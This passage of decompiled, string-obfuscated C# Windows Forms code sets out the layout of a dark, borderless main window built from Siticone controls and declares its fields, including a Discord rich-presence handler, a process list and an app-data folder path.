			this.bu.CheckedState.Parent = this.bu;
			this.bu.CustomImages.Parent = this.bu;
			this.i.SetDecoration(this.bu, 0);
			this.bu.FillColor = Color.Black;
			this.bu.Font = new Font(global::i.a("", 59604), 9f);
			this.bu.ForeColor = Color.Red;
			this.bu.HoveredState.Parent = this.bu;
			this.bu.Location = new Point(303, 80);
			this.bu.Name = global::i.a("", 58549);
			this.bu.ShadowDecoration.Parent = this.bu;
			this.bu.Size = new Size(123, 29);
			this.bu.TabIndex = 71;
			this.bu.Text = global::i.a("", 63659);
			this.bu.Click += this.bf;
			this.bc.BorderColor = Color.DarkRed;
			this.bc.BorderThickness = 1;
			this.bc.CheckedState.Parent = this.bc;
			this.bc.CustomImages.Parent = this.bc;
			this.i.SetDecoration(this.bc, 0);
			this.bc.FillColor = Color.Black;
			this.bc.Font = new Font(global::i.a("", 59604), 9f);
			this.bc.ForeColor = Color.Red;
			this.bc.HoveredState.Parent = this.bc;
			this.bc.Location = new Point(30, 82);
			this.bc.Name = global::i.a("", 62092);
			this.bc.ShadowDecoration.Parent = this.bc;
			this.bc.Size = new Size(123, 29);
			this.bc.TabIndex = 67;
			this.bc.Text = global::i.a("", 59645);
			this.bc.Click += this.ax;
			this.az.BackColor = Color.Transparent;
			this.i.SetDecoration(this.az, 0);
			this.az.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.az.ForeColor = Color.Red;
			this.az.Location = new Point(68, 34);
			this.az.Margin = new Padding(2);
			this.az.Name = global::i.a("", 61332);
			this.az.Size = new Size(186, 15);
			this.az.TabIndex = 62;
			this.az.Text = global::i.a("", 61489);
			this.i.SetDecoration(this.ba, 0);
			this.ba.Image = Resources.pngaaa_com_3790696;
			this.ba.Location = new Point(11, 10);
			this.ba.Name = global::i.a("", 58331);
			this.ba.Size = new Size(46, 35);
			this.ba.SizeMode = PictureBoxSizeMode.Zoom;
			this.ba.TabIndex = 25;
			this.ba.TabStop = false;
			this.bb.AutoSize = true;
			this.i.SetDecoration(this.bb, 0);
			this.bb.Font = new Font(global::i.a("", 60320), 18f, FontStyle.Bold);
			this.bb.ForeColor = Color.White;
			this.bb.Location = new Point(60, 6);
			this.bb.Name = global::i.a("", 62283);
			this.bb.Size = new Size(221, 32);
			this.bb.TabIndex = 9;
			this.bb.Text = global::i.a("", 61377);
			this.bp.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bp, 0);
			this.bp.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bp.ForeColor = SystemColors.ButtonHighlight;
			this.bp.Location = new Point(663, 319);
			this.bp.Margin = new Padding(2);
			this.bp.Name = global::i.a("", 58204);
			this.bp.Size = new Size(44, 15);
			this.bp.TabIndex = 77;
			this.bp.Text = global::i.a("", 58204);
			this.bi.CheckedState.Parent = this.bi;
			this.bi.CustomImages.Parent = this.bi;
			this.i.SetDecoration(this.bi, 0);
			this.bi.FillColor = Color.Transparent;
			this.bi.FillColor2 = Color.Transparent;
			this.bi.Font = new Font(global::i.a("", 60320), 10f, FontStyle.Bold);
			this.bi.ForeColor = Color.White;
			this.bi.HoveredState.Parent = this.bi;
			this.bi.Image = Resources.PngItem_2354504;
			this.bi.Location = new Point(18, 209);
			this.bi.Name = global::i.a("", 60880);
			this.bi.ShadowDecoration.Parent = this.bi;
			this.bi.Size = new Size(168, 52);
			this.bi.TabIndex = 76;
			this.bi.Text = global::i.a("", 60757);
			this.bi.Click += this.bl;
			this.y.CheckedState.Parent = this.y;
			this.y.CustomImages.Parent = this.y;
			this.i.SetDecoration(this.y, 0);
			this.y.FillColor = Color.Transparent;
			this.y.FillColor2 = Color.Transparent;
			this.y.Font = new Font(global::i.a("", 60320), 10f, FontStyle.Bold);
			this.y.ForeColor = Color.White;
			this.y.HoveredState.Parent = this.y;
			this.y.Image = Resources.game;
			this.y.Location = new Point(18, 151);
			this.y.Name = global::i.a("", 60769);
			this.y.ShadowDecoration.Parent = this.y;
			this.y.Size = new Size(169, 51);
			this.y.TabIndex = 72;
			this.y.Text = global::i.a("", 60820);
			this.y.Click += this.ac;
			this.z.CheckedState.Parent = this.z;
			this.z.CustomImages.Parent = this.z;
			this.i.SetDecoration(this.z, 0);
			this.z.FillColor = Color.Transparent;
			this.z.FillColor2 = Color.Transparent;
			this.z.Font = new Font(global::i.a("", 60320), 10f, FontStyle.Bold);
			this.z.ForeColor = Color.White;
			this.z.HoveredState.Parent = this.z;
			this.z.Image = Resources.pngaaa_com_3790696;
			this.z.Location = new Point(12, 93);
			this.z.Name = global::i.a("", 57446);
			this.z.ShadowDecoration.Parent = this.z;
			this.z.Size = new Size(175, 52);
			this.z.TabIndex = 71;
			this.z.Text = global::i.a("", 59319);
			this.z.Click += this.aa;
			this.aa.CheckedState.Parent = this.aa;
			this.aa.CustomImages.Parent = this.aa;
			this.i.SetDecoration(this.aa, 0);
			this.aa.FillColor = Color.Transparent;
			this.aa.FillColor2 = Color.Transparent;
			this.aa.Font = new Font(global::i.a("", 60320), 10f, FontStyle.Bold);
			this.aa.ForeColor = Color.White;
			this.aa.HoveredState.Parent = this.aa;
			this.aa.Image = Resources.kindpng_3933927;
			this.aa.Location = new Point(11, 271);
			this.aa.Name = global::i.a("", 59338);
			this.aa.ShadowDecoration.Parent = this.aa;
			this.aa.Size = new Size(175, 52);
			this.aa.TabIndex = 70;
			this.aa.Text = global::i.a("", 59083);
			this.aa.Click += this.ad;
			this.o.Enabled = true;
			this.o.Interval = 1;
			this.o.Tick += this.d;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.AutoValidate = AutoValidate.Disable;
			this.BackColor = Color.Black;
			base.ClientSize = new Size(662, 352);
			base.Controls.Add(this.bp);
			base.Controls.Add(this.bi);
			base.Controls.Add(this.ax);
			base.Controls.Add(this.aw);
			base.Controls.Add(this.at);
			base.Controls.Add(this.y);
			base.Controls.Add(this.z);
			base.Controls.Add(this.aa);
			base.Controls.Add(this.r);
			base.Controls.Add(this.k);
			base.Controls.Add(this.j);
			base.Controls.Add(this.h);
			base.Controls.Add(this.g);
			base.Controls.Add(this.ay);
			base.Controls.Add(this.u);
			base.Controls.Add(this.ap);
			base.Controls.Add(this.ai);
			this.i.SetDecoration(this, 1);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject(global::i.a("", 57920));
			base.Name = global::i.a("", 58031);
			base.Opacity = 0.85;
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = global::i.a("", 60000);
			base.TransparencyKey = Color.Maroon;
			base.Load += this.b;
			this.r.ResumeLayout(false);
			this.r.PerformLayout();
			((ISupportInitialize)this.s).EndInit();
			this.u.ResumeLayout(false);
			this.u.PerformLayout();
			((ISupportInitialize)this.w).EndInit();
			this.ai.ResumeLayout(false);
			this.ai.PerformLayout();
			((ISupportInitialize)this.ak).EndInit();
			this.ap.ResumeLayout(false);
			this.ap.PerformLayout();
			((ISupportInitialize)this.ar).EndInit();
			this.ay.ResumeLayout(false);
			this.ay.PerformLayout();
			((ISupportInitialize)this.ba).EndInit();
			((ISupportInitialize)this.q).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000012 RID: 18
		private DiscordRpc.EventHandlers a;

		// Token: 0x04000013 RID: 19
		private DiscordRpc.RichPresence b;

		// Token: 0x04000014 RID: 20
		public static string folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000015 RID: 21
		public static string specificFolder = Path.Combine(Main.folder, global::i.a("", 58459));

		// Token: 0x04000016 RID: 22
		public static Random random = new Random();

		// Token: 0x04000017 RID: 23
		private string c = Main.RandomString(5);

		// Token: 0x04000018 RID: 24
		private List<Process> d = new List<Process>();

		// Token: 0x0400001A RID: 26
		private SiticoneDragControl f;

		// Token: 0x0400001B RID: 27
		private SiticoneControlBox g;

		// Token: 0x0400001C RID: 28
		private SiticoneControlBox h;

		// Token: 0x0400001D RID: 29
		private SiticoneTransition i;

		// Token: 0x0400001E RID: 30
		private Label j;

		// Token: 0x0400001F RID: 31
		private Label k;

		// Token: 0x04000020 RID: 32
		private SiticoneShadowForm l;

		// Token: 0x04000021 RID: 33
		private SiticoneLabel m;

		// Token: 0x04000022 RID: 34
		private SiticoneLabel n;

		// Token: 0x04000023 RID: 35
		private System.Windows.Forms.Timer o;

		// Token: 0x04000024 RID: 36
		private SiticoneLabel p;

		// Token: 0x04000025 RID: 37
		private BindingSource q;

		// Token: 0x04000026 RID: 38
		private Panel r;

		// Token: 0x04000027 RID: 39
		private PictureBox s;

		// Token: 0x04000028 RID: 40
		private SiticoneLabel t;

		// Token: 0x04000029 RID: 41
		private SiticoneShadowPanel u;

		// Token: 0x0400002A RID: 42
		private SiticoneLabel v;

		// Token: 0x0400002B RID: 43
		private PictureBox w;

		// Token: 0x0400002C RID: 44
		private Label x;

		// Token: 0x0400002D RID: 45
		private SiticoneGradientButton y;

		// Token: 0x0400002E RID: 46
		private SiticoneGradientButton z;

		// Token: 0x0400002F RID: 47
		private SiticoneGradientButton aa;

		// Token: 0x04000030 RID: 48
		private SiticoneRoundedButton ab;

		// Token: 0x04000031 RID: 49
		private SiticoneRoundedButton ac;

		// Token: 0x04000032 RID: 50
		private SiticoneRoundedButton ad;

		// Token: 0x04000033 RID: 51
		private SiticoneRoundedButton ae;

		// Token: 0x04000034 RID: 52
		private SiticoneRoundedButton af;

		// Token: 0x04000035 RID: 53
		private SiticoneRoundedButton ag;

		// Token: 0x04000036 RID: 54
		private SiticoneRoundedButton ah;

		// Token: 0x04000037 RID: 55
		private SiticoneShadowPanel ai;

		// Token: 0x04000038 RID: 56
		private SiticoneLabel aj;

		// Token: 0x04000039 RID: 57
		private PictureBox ak;

		// Token: 0x0400003A RID: 58
		private Label al;

		// Token: 0x0400003B RID: 59
		private SiticoneRoundedButton am;

		// Token: 0x0400003C RID: 60
		private SiticoneLabel an;

		// Token: 0x0400003D RID: 61
		private SiticoneComboBox ao;

		// Token: 0x0400003E RID: 62
		private SiticoneShadowPanel ap;

		// Token: 0x0400003F RID: 63
		private SiticoneLabel aq;

		// Token: 0x04000040 RID: 64
		private PictureBox ar;

		// Token: 0x04000041 RID: 65
		private Label @as;

		// Token: 0x04000042 RID: 66
		private Label at;

		// Token: 0x04000043 RID: 67
		private PageSetupDialog au;

		// Token: 0x04000044 RID: 68
		private System.Windows.Forms.Timer av;

		// Token: 0x04000045 RID: 69
		private Label aw;

		// Token: 0x04000046 RID: 70
		private SiticoneLabel ax;

		// Token: 0x04000047 RID: 71
		private SiticoneShadowPanel ay;

		// Token: 0x04000048 RID: 72
		private SiticoneLabel az;

		// Token: 0x04000049 RID: 73
		private PictureBox ba;

		// Token: 0x0400004A RID: 74
		private Label bb;

		// Token: 0x0400004B RID: 75
		private SiticoneRoundedButton bc;

		// Token: 0x0400004C RID: 76
		private SiticoneButton bd;

		// Token: 0x0400004D RID: 77
		private SiticoneRoundedButton be;

		// Token: 0x0400004E RID: 78
		private SiticoneRoundedButton bf;

		// Token: 0x0400004F RID: 79
		private SiticoneLabel bg;

		// Token: 0x04000050 RID: 80
		private SiticoneTextBox bh;

		// Token: 0x04000051 RID: 81
		private SiticoneGradientButton bi;

		// Token: 0x04000052 RID: 82
		private SiticoneLabel bj;

		// Token: 0x04000053 RID: 83
		private SiticoneRoundedButton bk;

		// Token: 0x04000054 RID: 84
		private SiticoneRoundedButton bl;

		// Token: 0x04000055 RID: 85
		private SiticoneRoundedButton bm;

		// Token: 0x04000056 RID: 86
		private SiticoneLabel bn;

		// Token: 0x04000057 RID: 87
		private SiticoneLabel bo;

		// Token: 0x04000058 RID: 88
		private SiticoneLabel bp;

		// Token: 0x04000059 RID: 89
		private SiticoneLabel bq;

		// Token: 0x0400005A RID: 90
		private SiticoneTextBox br;

		// Token: 0x0400005B RID: 91
		private System.Windows.Forms.Timer bs;

		// Token: 0x0400005C RID: 92
		private SiticoneButton bt;

		// Token: 0x0400005D RID: 93
		private SiticoneRoundedButton bu;
	}
}
